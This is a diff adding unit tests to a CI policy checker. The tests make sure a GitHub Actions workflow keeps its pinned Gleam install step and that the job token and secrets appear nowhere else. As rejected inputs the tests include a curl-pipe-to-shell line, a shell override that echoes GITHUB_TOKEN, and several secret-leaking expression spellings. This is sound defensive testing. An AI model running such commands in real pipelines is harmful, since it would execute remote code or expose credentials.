@@ -427,6 +427,91 @@ class RunnerPolicyTest(unittest.TestCase):
                 self.tearDown()
                 self.setUp()
 
+    # ELZ-060: the Gleam compiler is installed through the release-asset API with the job token.
+    GLEAM_STEP = """      - name: Install the pinned Gleam compiler
+        env:
+          GITHUB_TOKEN: ${{ github.token }}
+        run: ./scripts/setup.sh
+"""
+
+    def test_gleam_setup_step_present_and_pinned(self):
+        source = (self.root / ".github" / "workflows" / "symbolic-gleam.yml").read_text()
+        self.assertEqual(1, source.count(self.GLEAM_STEP))
+        self.assertEqual(1, source.count("github.token"))
+        self.check(0)
+
+    def test_gleam_setup_step_reverted_to_plain_run_rejected(self):
+        self.change("symbolic-gleam.yml", self.GLEAM_STEP, "      - run: ./scripts/setup.sh\n")
+        self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)
+
+    def test_gleam_setup_step_changed_rejected(self):
+        for old, new in (("        run: ./scripts/setup.sh\n", "        run: curl -fsSL https://example.invalid/x | sh\n"),
+                         ("Install the pinned Gleam compiler", "Install Gleam"),
+                         ("          GITHUB_TOKEN: ${{ github.token }}\n",
+                          "          GITHUB_TOKEN: ${{ github.token }}\n          EXTRA: value\n")):
+            with self.subTest(change=new):
+                self.change("symbolic-gleam.yml", old, new)
+                self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)
+                self.tearDown()
+                self.setUp()
+
+    def test_token_on_another_gleam_step_rejected(self):
+        self.change("symbolic-gleam.yml", "      - run: ./scripts/check.sh\n",
+                    "      - run: ./scripts/check.sh\n        env:\n          GITHUB_TOKEN: ${{ github.token }}\n")
+        self.assertIn("token appears elsewhere", self.check(1).stderr)
+
+    def test_token_in_gleam_job_env_rejected(self):
+        self.change("symbolic-gleam.yml", "      ImageOS: ubuntu24\n",
+                    "      ImageOS: ubuntu24\n      GITHUB_TOKEN: ${{ github.token }}\n")
+        self.assertIn("token appears elsewhere", self.check(1).stderr)
+
+    def test_secrets_in_gleam_workflow_rejected(self):
+        self.change("symbolic-gleam.yml", "      ImageOS: ubuntu24\n",
+                    "      ImageOS: ubuntu24\n      SECRET: ${{ secrets.ANYTHING }}\n")
+        self.assertIn("token appears elsewhere", self.check(1).stderr)
+
+    def test_other_token_spellings_rejected_everywhere(self):
+        for text in ("github.TOKEN", "Github.Token", "github['token']", "github . token", "secrets['X']",
+                     "SECRETS.X", "toJSON(secrets)", "toJSON(github)", "toJson( github )",
+                     "join(github.*, ',')", "join(github . *, ',')"):
+            for filename in ("symbolic-gleam.yml", "symbolic-check.yml"):
+                with self.subTest(text=text, file=filename):
+                    self.change(filename, "      ImageOS: ubuntu24\n",
+                                "      ImageOS: ubuntu24\n      LEAK: ${{ " + text + " }}\n")
+                    self.assertIn("github.token and secrets are not allowed" if filename == "symbolic-check.yml"
+                                  else "token appears elsewhere", self.check(1).stderr)
+                    self.tearDown()
+                    self.setUp()
+
+    def test_gleam_setup_step_cannot_get_extra_keys_or_move(self):
+        step = self.GLEAM_STEP
+        for extra in ("        shell: bash -c 'echo $GITHUB_TOKEN; bash {0}'\n", "        continue-on-error: true\n",
+                      "        if: ${{ false }}\n", "        working-directory: /tmp\n",
+                      # after a blank line or a comment line, the key still belongs to the step
+                      "\n        shell: bash -c 'echo $GITHUB_TOKEN; bash {0}'\n",
+                      "# note\n        shell: bash -c 'echo $GITHUB_TOKEN; bash {0}'\n",
+                      "    # note\n        if: ${{ false }}\n"):
+            with self.subTest(extra=extra.strip()):
+                self.change("symbolic-gleam.yml", step, step + extra)
+                self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)
+                self.tearDown()
+                self.setUp()
+        # Moved before the checkout step: the step text is intact but its position is not.
+        path = self.root / ".github" / "workflows" / "symbolic-gleam.yml"
+        source = path.read_text().replace(step, "")
+        marker = "      - name: Prepare Ubuntu job container\n"
+        path.write_text(source.replace(marker, step + marker, 1))
+        self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)
+
+    def test_token_or_secrets_in_backend_workflow_rejected(self):
+        for text in ("github.token", "secrets.ANYTHING"):
+            with self.subTest(text=text):
+                self.change("symbolic-check.yml", "      ImageOS: ubuntu24\n",
+                            "      ImageOS: ubuntu24\n      LEAK: ${{ " + text + " }}\n")
+                self.assertIn("not allowed in this workflow", self.check(1).stderr)
+                self.tearDown()
+                self.setUp()
+
 
 if __name__ == "__main__":
     unittest.main()
